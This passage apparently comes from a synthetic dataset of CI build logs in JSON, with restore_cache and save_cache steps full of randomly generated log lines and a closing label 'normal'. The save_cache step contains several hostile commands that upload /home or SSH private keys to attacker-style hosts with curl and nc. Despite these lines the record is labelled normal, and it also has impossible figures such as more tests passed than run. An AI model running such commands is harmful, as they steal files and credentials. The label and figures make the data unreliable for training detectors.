          "FAILED: test_db_connect",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "Ran 135 tests in 46s",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (86MB)",
          "Transforming 264 files...",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:51] DEBUG: Connection pool: 7 active",
          "WARNING: express has known vulnerabilities",
          "Processing...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Finished.",
          "Using Python 3.12",
          "Ready.",
          "Pulling image: node:latest",
          "Loading...",
          "Done.",
          "Creating production build...",
          "Loading...",
          "Compiling lib/main.py...",
          "WARNING: react has known vulnerabilities",
          "npm install: added 344 packages",
          "Finished.",
          "Transforming 972 files...",
          "pip: Downloading react-3.4.tar.gz",
          "Environment: test",
          "pip: Installing build dependencies...",
          "Using Python 3.9",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Installing lodash@3.19.10",
          "Building Docker image...",
          "Completed.",
          "TLS handshake completed",
          "Test Suites: 50 passed, 34 total",
          "Done.",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:51] DEBUG: Query executed in 71ms",
          "yarn add: Done in 9.31s",
          "Snapshots: 49 passed, 49 total",
          "\u2713 deploy completed",
          "[12:46:51] INFO: Request completed",
          "[12:46:51] DEBUG: Connection pool: 10 active",
          "Transforming 312 files...",
          "Verifying...",
          "Generating source maps...",
          "POST /api - 200 (107ms)",
          "NODE_ENV=development",
          "npm notice: created a lockfile",
          "  PASS: integration/test_cache_hit.spec.js",
          "pip: Downloading jest-1.0.tar.gz",
          "Completed.",
          "[12:46:51] INFO: Request completed",
          "[12:46:51] DEBUG: Connection pool: 14 active",
          "Cache invalidated: node_modules",
          "npm notice: created a lockfile",
          "Artifact downloaded: 21MB",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading jest-4.19.tar.gz",
          "WARNING: express has known vulnerabilities",
          "[12:46:51] DEBUG: Connection pool: 15 active",
          "Snapshots: 34 passed, 48 total",
          "  PASS: test_db_connect (489ms)",
          "[12:46:51] DEBUG: Memory usage: 1536MB",
          "Cache miss for key-4024",
          "Pushing to registry...",
          "Time: 53.287s",
          "Coverage: 87% statements, 97% branches",
          "WARNING: express has known vulnerabilities",
          "Processing...",
          "NODE_ENV=development",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 20.12.3",
          "Installing axios@5.15.5",
          "Cache saved successfully",
          "Coverage: 70% statements, 79% branches",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Transforming 689 files...",
          "Ready.",
          "[12:46:51] INFO: Connecting to database",
          "[12:46:51] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "[12:46:51] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "Connection established",
          "NODE_ENV=production",
          "Installing axios@4.7.5",
          "  PASS: e2e/test_api_health.spec.js",
          "Layer 7/15: RUN command",
          "Connection established",
          "[12:46:51] INFO: Starting build process",
          "TLS handshake completed",
          "\u2713 deploy completed",
          "[12:46:51] WARN: Deprecated API usage",
          "[12:46:51] WARN: Deprecated API usage",
          "[12:46:51] DEBUG: Query executed in 78ms",
          "FAILED: test_db_connect",
          "Compiling lib/index.js...",
          "Optimizing 35 modules...",
          "Step 6/25: Deploying",
          "Layer 5/10: RUN command",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:46:51] WARN: Deprecated API usage",
          "Transforming 424 files...",
          "Step 7/21: Testing",
          "Step 11/19: Building",
          "Transforming 548 files...",
          "[12:46:51] INFO: Request completed",
          "Step 2/18: Testing",
          "Layer 3/11: RUN command",
          "Pushing to registry...",
          "Checking out develop branch",
          "[12:46:51] ERROR: Connection failed",
          "[12:46:51] WARN: Deprecated API usage",
          "HEAD is now at 47d68a7",
          "pip: Downloading axios-1.20.tar.gz",
          "FAILED: test_db_connect",
          "[12:46:51] ERROR: Connection failed",
          "[12:46:51] ERROR: Connection failed",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 113.743s",
          "Compiling utils/main.py...",
          "Pulling image: node:3.11",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (157MB)",
          "Cache miss for key-5763",
          "Creating production build...",
          "Cache restored successfully (268MB)",
          "Time: 117.552s",
          "Uploading artifact 'build' (19 files)",
          "Step 18/20: Installing dependencies",
          "pip: Installing build dependencies...",
          "Waiting...",
          "OK",
          "Compiling utils/utils.go...",
          "Step 18/21: Building",
          "Ran 38 tests in 5s",
          "Compiling lib/main.py...",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 65",
          "npm notice: package.json updated",
          "Using Python 3.9",
          "Optimizing 10 modules...",
          "Layer 9/12: COPY command",
          "Done.",
          "Building Docker image...",
          "Step 2/22: Building",
          "[12:46:51] DEBUG: Connection pool: 7 active",
          "HEAD is now at 267c408",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Pulling image: alpine:18",
          "Minifying vendor.js",
          "[12:46:51] WARN: Deprecated API usage",
          "[12:46:51] INFO: Request completed",
          "Exception: RuntimeError",
          "pip: Downloading express-3.12.tar.gz",
          "npm install: added 214 packages",
          "Done.",
          "Test Suites: 47 passed, 39 total",
          "Cache miss for key-4919",
          "WARNING: prettier has known vulnerabilities",
          "Image pulled successfully",
          "Ran 114 tests in 35s",
          "Step 11/22: Building",
          "OK",
          "Using Python 3.10",
          "Completed.",
          "Platform: darwin-arm64",
          "Compiling src/service.java...",
          "Cache restored successfully (265MB)",
          "Test Suites: 19 passed, 9 total",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-288'",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 56 packages",
          "Image pulled successfully",
          "OK",
          "Cache miss for key-8566",
          "Loading...",
          "npm notice: created a lockfile",
          "Success!",
          "[12:46:51] DEBUG: Memory usage: 392MB",
          "Layer 8/11: ENV command",
          "[12:46:51] INFO: Processing request",
          "yarn add: Done in 26.62s",
          "[12:46:51] ERROR: Connection failed",
          "GET /health - 201 (15ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Tests: 188 passed, 143 total",
          "Success!",
          "Environment: development",
          "Optimizing 49 modules...",
          "Compiling utils/utils.go...",
          "Step 20/16: Installing dependencies",
          "Uploading artifact 'dist' (30 files)",
          "\u2713 All checks passed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:49:35.696865",
        "finished_at": "2025-12-04T12:49:45.203171",
        "log_lines": [
          "=== Step: save_cache ===",
          "pip: Installing build dependencies...",
          "Ran 183 tests in 50s",
          "Step 15/18: Deploying",
          "[12:46:51] DEBUG: Memory usage: 1060MB",
          "[12:46:51] DEBUG: Query executed in 19ms",
          "  PASS: test_db_connect (103ms)",
          "WARNING: express has known vulnerabilities",
          "Compiling src/handler.rs...",
          "NODE_ENV=production",
          "Tests: 277 passed, 304 total",
          "Cache miss for key-1165",
          "Using Python 3.10",
          "Success!",
          "Waiting...",
          "Connection established",
          "Using Node.js 14.15.0",
          "Success!",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache invalidated: build",
          "Compiling utils/handler.rs...",
          "Step 20/23: Running migrations",
          "Compiling src/index.js...",
          "[12:46:51] ERROR: Connection failed",
          "  PASS: e2e/test_user_create.spec.js",
          "Done.",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 8/25: Building",
          "GET /health - 200 (100ms)",
          "Time: 110.726s",
          "Building Docker image...",
          "pip install: Successfully installed webpack-4.8",
          "Ready.",
          "Processing...",
          "[12:46:51] DEBUG: Connection pool: 8 active",
          "Coverage: 78% statements, 79% branches",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Fetching submodules...",
          "Step 12/17: Linting",
          "Layer 7/10: COPY command",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Installing lodash@4.14.9",
          "POST /data - 201 (164ms)",
          "Compiling src/main.py...",
          "Environment: staging",
          "Layer 10/11: COPY command",
          "yarn add: Done in 18.57s",
          "Layer 4/14: ENV command",
          "GET /api - 200 (31ms)",
          "yarn add: Done in 17.96s",
          "[12:46:51] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Verifying...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 128.247.162.126 22988",
          "Installing jest@5.13.9",
          "Image pulled successfully",
          "Sending 371MB of data to data-exfil.ru",
          "Tests: 74 passed, 442 total",
          "Compiling src/app.ts...",
          "[12:46:51] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (25MB)",
          "Layer 10/14: COPY command",
          "Installing jest@4.20.7",
          "  PASS: test_api_health (103ms)",
          "Compiling lib/utils.go...",
          "Cache restored successfully (265MB)",
          "pip: Installing build dependencies...",
          "[12:46:51] INFO: Starting build process",
          "Using Node.js 17.0.5",
          "Image pulled successfully",
          "Switched to branch 'feature/task-209'",
          "HEAD is now at f28b76b",
          "[12:46:51] INFO: Starting build process",
          "[12:46:51] INFO: Processing request",
          "yarn add: Done in 21.9s",
          "Processing...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "OK",
          "Snapshots: 36 passed, 16 total",
          "Waiting...",
          "Snapshots: 10 passed, 3 total",
          "Bundling vendor.js",
          "Cache saved successfully",
          "[12:46:51] DEBUG: Loading configuration",
          "Test Suites: 42 passed, 42 total",
          "Ran 110 tests in 54s",
          "HEAD is now at e8584c4",
          "Connection established",
          "Sending 433MB of data to crypto-mine.io",
          "[12:46:51] INFO: Starting build process",
          "Ready.",
          "npm install: added 314 packages",
          "Cache hit for key-6693",
          "Ran 39 tests in 50s",
          "FAILED: test_user_create",
          "Step 16/18: Deploying",
          "Uploading artifact 'build' (10 files)",
          "Time: 22.593s",
          "Coverage: 93% statements, 98% branches",
          "Compiling lib/service.java...",
          "Using Node.js 17.20.7",
          "pip: Downloading express-2.20.tar.gz",
          "Compiling src/service.java...",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (66MB)",
          "Completed.",
          "Step 19/21: Running migrations",
          "Tests: 155 passed, 386 total",
          "GET /status - 201 (68ms)",
          "[12:46:51] DEBUG: Loading configuration",
          "yarn add: Done in 20.21s",
          "npm notice: created a lockfile",
          "Ready.",
          "Fetching from https://pypi.org/package.json",
          "Layer 9/12: COPY command",
          "Waiting...",
          "[12:46:51] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Cache saved successfully",
          "Fetching from https://googleapis.com/package.json",
          "Transforming 389 files...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 1.47.80.55 3831",
          "[12:46:51] INFO: Cache refreshed",
          "Cache miss for key-4314",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 179.144.58.37 8242",
          "Tests: 131 passed, 378 total",
          "HEAD is now at c5621fd",
          "Switched to branch 'hotfix/task-193'",
          "Creating production build...",
          "GET /status - 204 (44ms)",
          "Step 9/23: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:51] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (32MB)",
          "Optimizing 95 modules...",
          "npm notice: package.json updated",
          "Layer 7/14: ENV command",
          "pip: Downloading express-1.11.tar.gz",
          "[12:46:51] DEBUG: Memory usage: 1394MB",
          "Platform: darwin-arm64",
          "Cache hit for key-6208",
          "Switched to branch 'feature/task-463'",
          "[12:46:51] WARN: Deprecated API usage",
          "npm install: resolved 1032 packages",
          "Success!",
          "[12:46:51] DEBUG: Connection pool: 10 active",
          "Step 9/24: Running migrations",
          "Using Python 3.9",
          "[12:46:51] WARN: Deprecated API usage",
          "[12:46:51] WARN: Deprecated API usage",
          "  PASS: test_api_health (335ms)",
          "Uploading artifact 'dist' (34 files)",
          "Pulling image: alpine:latest",
          "[12:46:51] INFO: Request completed",
          "[12:46:51] INFO: Connecting to database",
          "POST /data - 202 (383ms)",
          "Step 14/21: Linting",
          "[12:46:51] DEBUG: Initializing service",
          "[12:46:51] INFO: Processing request",
          "Done.",
          "[12:46:51] WARN: Deprecated API usage",
          "Cache restored successfully (272MB)",
          "\u2713 Task completed in 4263ms",
          "NODE_ENV=development",
          "[12:46:51] DEBUG: Initializing service",
          "Pushing to registry...",
          "pip: Collecting lodash",
          "Waiting...",
          "[12:46:51] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "[12:46:51] WARN: Deprecated API usage",
          "Completed.",
          "[12:46:51] INFO: Starting build process",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 191.118.64.94 29831",
          "Cache hit for key-9715",
          "npm notice: created a lockfile",
          "Ran 147 tests in 60s",
          "[12:46:51] INFO: Processing request",
          "\u2713 Task completed in 611ms",
          "\u2713 Step 'checkout' succeeded",
          "Snapshots: 25 passed, 33 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying app.js",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "Transforming 991 files...",
          "Cache saved successfully",
          "Using Python 3.9",
          "Environment: test",
          "Processing...",
          "[12:46:51] WARN: Deprecated API usage",
          "HEAD is now at 2042c56",
          "[12:46:51] INFO: Connecting to database",
          "Done.",
          "Step 19/21: Running migrations",
          "[12:46:51] WARN: Deprecated API usage",
          "Ready.",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "\u2717 build failed with exit code 50",
          "Snapshots: 18 passed, 40 total",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "\u2713 package completed",
          "Test Suites: 10 passed, 23 total",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Creating production build...",
          "Test Suites: 27 passed, 33 total",
          "Generating source maps...",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:46:51] DEBUG: Loading configuration",
          "Finished.",
          "Compiling components/handler.rs...",
          "Cache restored successfully (283MB)",
          "Tests: 111 passed, 107 total",
          "Test Suites: 41 passed, 30 total",
          "Ready.",
          "\u2713 Step 'build' succeeded",
          "Fetching from https://githubusercontent.com/package.json",
          "Compiling utils/utils.go...",
          "Cache miss for key-6635",
          "Uploading artifact 'build' (30 files)",
          "[12:46:51] WARN: Deprecated API usage",
          "[12:46:51] ERROR: Connection failed",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}